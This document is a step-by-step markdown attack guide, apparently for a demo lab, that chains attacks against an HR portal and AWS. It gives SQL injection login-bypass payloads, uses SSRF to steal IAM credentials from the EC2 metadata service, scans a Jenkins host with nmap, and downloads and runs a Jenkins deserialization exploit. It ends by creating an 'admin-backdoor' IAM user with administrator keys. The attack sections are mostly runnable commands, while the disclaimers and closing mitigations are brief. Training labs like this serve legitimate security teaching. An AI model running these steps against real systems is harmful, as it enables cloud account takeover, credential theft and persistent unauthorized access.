
# HR Portal Attack Guide

This document provides a step-by-step guide on how to exploit the vulnerabilities in the HR Portal application. **This is for educational purposes only** and should only be performed in a controlled environment with explicit authorization.

## Prerequisites

- Basic understanding of web security concepts
- Basic understanding of Linux command line
- Access to the target HR Portal application
- Access to tools like Burp Suite, NMAP, and other penetration testing tools

## Warning ⚠️

**These attacks should only be performed in a controlled environment with proper authorization. Unauthorized testing against systems is illegal and unethical.**

## Attack 1: SQL Injection (SQLi)

SQL Injection allows attackers to execute arbitrary SQL commands on the database server.

### Step 1: Access the Login Page

1. Navigate to the HR Portal login page at `http://[EC2-IP-ADDRESS]/login`
2. You'll see a standard login form with email and password fields

### Step 2: Perform SQL Injection

1. In the email field, enter one of the following SQL injection payloads:
   - `' OR '1'='1`  
   - `admin@example.com' --`  
   - `john@example.com' OR 1=1--`
2. In the password field, enter anything (it will be ignored due to the injection)
3. Click the "Log In" button

### Step 3: Verify Access

1. If successful, you'll be logged in as the first user in the database (likely John Doe)
2. You now have access to the HR Portal with employee privileges

### Explanation

The vulnerable login code looks like this:
```javascript
// Vulnerable code
console.log(`SELECT * FROM users WHERE email='${email}' AND password='${password}'`);
```

When you input `' OR '1'='1`, the query becomes:
```sql
SELECT * FROM users WHERE email='' OR '1'='1' AND password='anything'
```

Since `'1'='1'` is always true, this returns all users and logs you in as the first user.

## Attack 2: Server-Side Request Forgery (SSRF)

SSRF allows attackers to make the server perform HTTP requests to internal resources that should not be accessible.

### Step 1: Access the Document Upload Page

1. First, log in to the HR Portal (you can use the SQL injection from Attack 1)
2. Navigate to the Document Upload page (`/documents`)

### Step 2: Prepare the SSRF Attack

1. Select any file to upload (the content doesn't matter)
2. Look for the "Upload Destination URL" field
3. By default, it will contain `s3://employee-bucket/documents/`

### Step 3: Perform the SSRF Attack to Access EC2 Metadata

1. Change the upload URL to: `http://169.254.169.254/latest/meta-data/`
2. Click "Upload Document"
3. The server will attempt to contact AWS metadata service instead of S3
4. Observe the response, which should contain EC2 metadata information

### Step 4: Extract IAM Credentials

1. Change the upload URL to: `http://169.254.169.254/latest/meta-data/iam/security-credentials/hr-portal-ec2-role`
2. Click "Upload Document"
3. This will return temporary AWS credentials including:
   - `AccessKeyId`
   - `SecretAccessKey`
   - `Token`
4. Save these credentials for the next steps

### Step 5: Configure AWS CLI with the Stolen Credentials

```bash
# Configure AWS CLI with the stolen credentials
export AWS_ACCESS_KEY_ID=ASIA...  # Use the AccessKeyId from Step 4
export AWS_SECRET_ACCESS_KEY=...  # Use the SecretAccessKey from Step 4
export AWS_SESSION_TOKEN=...      # Use the Token from Step 4
export AWS_DEFAULT_REGION=us-east-1  # Adjust region if necessary
```

### Step 6: Use AWS CLI to Discover Other EC2 Instances

```bash
# List all EC2 instances in the account
aws ec2 describe-instances

# Store the Jenkins server information
JENKINS_INSTANCE_ID=$(aws ec2 describe-instances --filters "Name=tag:Name,Values=Demo-Jenkins" --query "Reservations[0].Instances[0].InstanceId" --output text)
JENKINS_PRIVATE_IP=$(aws ec2 describe-instances --filters "Name=tag:Name,Values=Demo-Jenkins" --query "Reservations[0].Instances[0].PrivateIpAddress" --output text)
JENKINS_AZ=$(aws ec2 describe-instances --filters "Name=tag:Name,Values=Demo-Jenkins" --query "Reservations[0].Instances[0].Placement.AvailabilityZone" --output text)
```

## Attack 3: Network Scanning with NMAP

After identifying the Jenkins server, use NMAP to scan for open ports and services.

### Step 1: Install NMAP (if not already installed)

```bash
# On Debian/Ubuntu
sudo apt-get update && sudo apt-get install -y nmap

# On RHEL/CentOS/Amazon Linux
sudo yum install -y nmap
```

### Step 2: Scan the Jenkins Server

```bash
# Scan top ports
nmap -sS -sV $JENKINS_PRIVATE_IP

# Perform more detailed scan on specific ports
nmap -sS -sV -p 8080,22,443,80 $JENKINS_PRIVATE_IP
```

### Step 3: Identify Jenkins Version

Look for service information in the NMAP output. You should see Jenkins 2.32.1 running on port 8080.

Example output:
```
8080/tcp  open  http    Jetty 9.2.z-SNAPSHOT (Jenkins 2.32.1)
```

## Attack 4: Exploiting Jenkins 2.32.1 Vulnerability

Jenkins 2.32.1 has known security vulnerabilities that can be exploited.

### Step 1: Connect to the Jenkins Instance

Use AWS EC2 Instance Connect to establish an SSH connection to the Jenkins server:

```bash
# Generate a temporary SSH key
ssh-keygen -t rsa -f /tmp/temp_key -N ""

# Push the public key to the Jenkins EC2 instance
aws ec2-instance-connect send-ssh-public-key \
  --instance-id $JENKINS_INSTANCE_ID \
  --availability-zone $JENKINS_AZ \
  --instance-os-user ec2-user \
  --ssh-public-key file:///tmp/temp_key.pub

# Connect using the private key
ssh -i /tmp/temp_key ec2-user@$JENKINS_PRIVATE_IP
```

### Step 2: Access Jenkins Web Interface

1. Once connected, access the Jenkins web interface at `http://$JENKINS_PRIVATE_IP:8080`
2. Retrieve the initial admin password:
   ```bash
   sudo cat /tmp/jenkins-password.txt
   ```

### Step 3: Exploit CVE-2017-1000353 (Jenkins Java Deserialization)

1. Download the exploit:
   ```bash
   wget https://github.com/vulhub/CVE-2017-1000353/archive/refs/heads/master.zip
   unzip master.zip
   cd CVE-2017-1000353-master
   ```

2. Build the exploit:
   ```bash
   # Install Java if not already installed
   sudo yum install -y java-1.8.0-openjdk-devel
   
   # Compile the exploit
   javac -cp "commons-io-2.5.jar:commons-collections-3.2.2.jar:commons-codec-1.9.jar" *.java
   ```

3. Generate the payload:
   ```bash
   java -cp ".:commons-io-2.5.jar:commons-collections-3.2.2.jar:commons-codec-1.9.jar" Payload
   ```

4. Send the exploit:
   ```bash
   python2 exploit.py http://$JENKINS_PRIVATE_IP:8080 payload.ser
   ```

5. Check if the exploit was successful by looking for evidence of command execution

## Attack 5: Privilege Escalation Using AWS IAM Permissions

Now we'll leverage the overly permissive IAM role to create and invoke Lambda functions.

### Step 1: Check Available Permissions

```bash
# List permissions for the role
aws iam list-attached-role-policies --role-name hr-portal-ec2-role

# Get details for the Jenkins Lambda policy
aws iam get-policy --policy-arn $(aws iam list-attached-role-policies --role-name hr-portal-ec2-role --query "AttachedPolicies[?PolicyName=='jenkins-lambda-policy'].PolicyArn" --output text)

# Get the policy version details
aws iam get-policy-version --policy-arn $(aws iam list-attached-role-policies --role-name hr-portal-ec2-role --query "AttachedPolicies[?PolicyName=='jenkins-lambda-policy'].PolicyArn" --output text) --version-id v1
```

### Step 2: Create a Malicious Lambda Function

```bash
# Create a temporary directory for our Lambda function
mkdir -p /tmp/lambda-function
cd /tmp/lambda-function

# Create a Lambda function that lists all IAM users
cat > index.js <<EOF
exports.handler = async (event) => {
  const AWS = require('aws-sdk');
  const iam = new AWS.IAM();
  
  // Get all IAM users
  const users = await iam.listUsers().promise();
  
  return {
    statusCode: 200,
    body: JSON.stringify(users),
  };
};
EOF

# Zip the Lambda function
zip function.zip index.js
```

### Step 3: Create an IAM Role for Lambda Execution

```bash
# Create a trust policy document
cat > trust-policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "lambda.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF

# Create the role
aws iam create-role --role-name lambda-execution-role --assume-role-policy-document file://trust-policy.json

# Attach the administrator access policy to the role (this is what makes it dangerous)
aws iam attach-role-policy --role-name lambda-execution-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Step 4: Create and Invoke the Lambda Function

```bash
# Create the Lambda function
aws lambda create-function \
  --function-name privilege-escalation-demo \
  --runtime nodejs18.x \
  --role $(aws iam get-role --role-name lambda-execution-role --query 'Role.Arn' --output text) \
  --handler index.handler \
  --zip-file fileb://function.zip

# Invoke the Lambda function and capture the output
aws lambda invoke \
  --function-name privilege-escalation-demo \
  --payload '{}' \
  response.json

# View the output
cat response.json
```

### Step 5: Leverage the AdminstratorAccess to Create a Privileged IAM User

```bash
# Create a new policy document for creating IAM users
cat > lambda-create-user.js <<EOF
exports.handler = async (event) => {
  const AWS = require('aws-sdk');
  const iam = new AWS.IAM();
  
  // Create a new IAM user
  await iam.createUser({
    UserName: 'admin-backdoor'
  }).promise();
  
  // Create access keys for the user
  const accessKey = await iam.createAccessKey({
    UserName: 'admin-backdoor'
  }).promise();
  
  // Attach AdministratorAccess policy to the user
  await iam.attachUserPolicy({
    UserName: 'admin-backdoor',
    PolicyArn: 'arn:aws:iam::aws:policy/AdministratorAccess'
  }).promise();
  
  return {
    statusCode: 200,
    body: JSON.stringify(accessKey),
  };
};
EOF

# Zip the function
zip create-user.zip lambda-create-user.js

# Update the Lambda function
aws lambda update-function-code \
  --function-name privilege-escalation-demo \
  --zip-file fileb://create-user.zip

# Invoke the Lambda function
aws lambda invoke \
  --function-name privilege-escalation-demo \
  --payload '{}' \
  user-created.json

# View the credentials for the new admin user
cat user-created.json
```

### Step 6: Use the New Admin User Credentials

```bash
# Configure AWS CLI with the new credentials
export AWS_ACCESS_KEY_ID="[AccessKeyId from user-created.json]"
export AWS_SECRET_ACCESS_KEY="[SecretAccessKey from user-created.json]"
unset AWS_SESSION_TOKEN  # Remove the temporary token

# Verify full access as the new user
aws iam get-user
aws iam list-users
aws ec2 describe-instances
aws s3 ls
```

## Mitigation Recommendations

After understanding these attacks, here are recommended mitigations:

### For SQL Injection
- Use parameterized queries or prepared statements
- Implement input validation and sanitization
- Use ORM libraries that handle SQL escaping automatically

### For SSRF
- Implement strict URL validation and whitelisting
- Use an allow-list for DNS resolution and IP addresses
- Block access to internal metadata services
- Use VPC endpoint policies to control access to AWS services

### For Jenkins Security
- Keep Jenkins up-to-date with security patches
- Implement the principle of least privilege
- Use Security Plugins for Jenkins
- Configure proper authentication and authorization
- Disable unnecessary features

### For IAM Security
- Follow the principle of least privilege
- Use IAM Access Analyzer to identify over-permissive policies
- Implement strict policies with specific resource ARNs
- Use IAM Roles with temporary credentials instead of long-term access keys
- Enable AWS CloudTrail for auditing all API calls

## Conclusion

These attack scenarios demonstrate the importance of proper security practices in cloud environments. By understanding how these attacks work, security professionals can better protect their systems against similar threats.

**Remember:** Always obtain proper authorization before performing security testing against any system.
